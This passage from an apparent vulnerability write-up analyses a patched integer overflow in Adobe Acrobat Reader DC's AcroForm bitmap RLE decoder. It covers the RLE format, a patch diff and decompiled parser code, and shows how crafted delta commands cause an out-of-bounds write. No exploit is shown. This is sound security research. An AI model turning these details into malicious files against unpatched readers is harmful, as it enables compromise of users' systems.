id="3-2-Run-Length-Encoding"><a href="#3-2-Run-Length-Encoding" class="headerlink" title="3.2 Run Length Encoding"></a>3.2 Run Length Encoding</h3><p>Two types of <strong>run length encoding</strong> methods can be used in bitmap files: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> .</p><h4 id="3-2-1-RLE8"><a href="#3-2-1-RLE8" class="headerlink" title="3.2.1 RLE8"></a>3.2.1 RLE8</h4><p>The RLE8 compression algorithm is used to compress an 8-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes:</p><ul><li><p>If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the color index that is contained in the second byte.</p></li><li><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul></li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte represents the number of bytes that follow, each of which contains the color index of a single pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of an 8-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows (two-digit values represent a color index for a single pixel):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4"><a href="#3-2-2-RLE4" class="headerlink" title="3.2.2 RLE4"></a>3.2.2 RLE4</h4><p>The RLE4 compression algorithm is used to compress a 4-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes. If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the two color indexes that are contained in the high-order and low-order bits of the second byte.</p><p>The first pixel is drawn using the color specified by the high-order 4 bits, the second is drawn using the color in the low-order 4 bits, the third is drawn using the color in the high-order 4 bits, and so on, until all the pixels specified by the first byte have been drawn.</p><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte contains the number of 4-bit color indexes that follow. Subsequent bytes contain color indexes in their high- and low-order 4 bits, one color index for each pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of a 4-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-Vulnerability-Details"><a href="#0x04-Vulnerability-Details" class="headerlink" title="0x04. Vulnerability Details"></a>0x04. Vulnerability Details</h2><h3 id="4-1-Code-Identification"><a href="#4-1-Code-Identification" class="headerlink" title="4.1 Code Identification"></a>4.1 Code Identification</h3><p>According to the advisory on ZDI’s website, we know that the flaw exists within the <strong>AcroForm</strong> module. It’s the forms plug-in of Adobe Acrobat Reader DC and is responsible for parsing <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA forms</a> . Following is the path of binary file of this plug-in:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>Generally speaking, when doing patch analysis we may want to use <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> to help identify the changed functions between the old and new versions of the binary file. But it won’t be easy to find the target one if too many functions were changed. And that’s the case of <code>AcroForm.api</code> . Here we’ll use some trivial tricks to identify the related functions.</p><p>The following analysis was carried out on Adobe Acrobat Reader DC <code>2019.012.20035</code> . The same method can be applied to version <code>2019.012.20036</code> .</p><ol><li>Search string <code>PNG</code> in IDA and we’ll find one at <code>.rdata:20F9A374</code> </li><li>Find cross references to <code>20F9A374</code> and we’ll go to function <code>sub_20CF3A3F</code> </li><li>Obviously function <code>sub_20CF3A3F</code> is responsible for identifying the type of the image</li><li>Find cross references to <code>sub_20CF3A3F</code> and we’ll go to function <code>sub_20CF4BE8</code> </li><li>Function <code>sub_20CF4BE8</code> will call corresponding image parsing functions according to image types</li><li>Function <code>sub_20CF3E5F</code> , which will be called by function <code>sub_20CF4870</code> , is responsible for parsing bitmap images</li></ol><p>The result of BinDiff shows that some basic blocks were changed in function <code>sub_20CF3E5F</code> . Let’s take the basic block which begins at <code>20CF440F</code> as an example to show the difference.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>It’s obvious that the code was changed to prevent integer overflow circumstances.</p><h3 id="4-2-Vulnerability-Analysis"><a href="#4-2-Vulnerability-Analysis" class="headerlink" title="4.2 Vulnerability Analysis"></a>4.2 Vulnerability Analysis</h3><p>Thanks to <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> , we can quickly understand what’s going on in function <code>sub_20CF3E5F</code> .</p><h4 id="4-2-1-RLE8-Decoding"><a href="#4-2-1-RLE8-Decoding" class="headerlink" title="4.2.1 RLE8 Decoding"></a>4.2.1 RLE8 Decoding</h4><p>Following pseudo code, which was extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                         <span class="comment">// means have compressed data</span></span><br><span class="line">        <span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// uncompressed data</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// uncompressed data</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Based on previous patch analysis, it’s obvious that integer overflow can be triggered in the following <code>if</code> statement.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>The flaw exists within the arithmetic computation of <code>(unsigned __int8)cmd + xpos</code> . Here the value of both variables can be controlled by the attacker. And Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data.</p><ol><li>The value of <code>(unsigned __int8)cmd</code> can be controlled directly in the bitmap file</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br></pre></td></tr></table></figure><ol start="2"><li>The value of <code>xpos</code> can be controlled by arranging lots of <code>delta</code> commands in <strong>encoded mode</strong></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// move to right, add any value in [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// OOB write with constrolled data</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-Decoding"><a href="#4-2-2-RLE4-Decoding" class="headerlink" title="4.2.2 RLE4 Decoding"></a>4.2.2 RLE4 Decoding</h4><p>Following pseudo code, which was also extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE4 compressed data. The decoding process was almost the same, but it’s a little more complicated than RLE8 since the data unit was not a byte.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                     <span class="comment">// means have compressed data</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line">        <span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// even index -&gt; high-order 4 bits</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// odd index -&gt; low-order 4 bits</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// odd xpos, old byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// even xpos, new byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// move to up</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// uncompressed data</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// read 1 byte data</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// low-order 4 bits</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// high-order 4 bits</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer overflow can be triggered in two spots, one exists within the handling of compressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 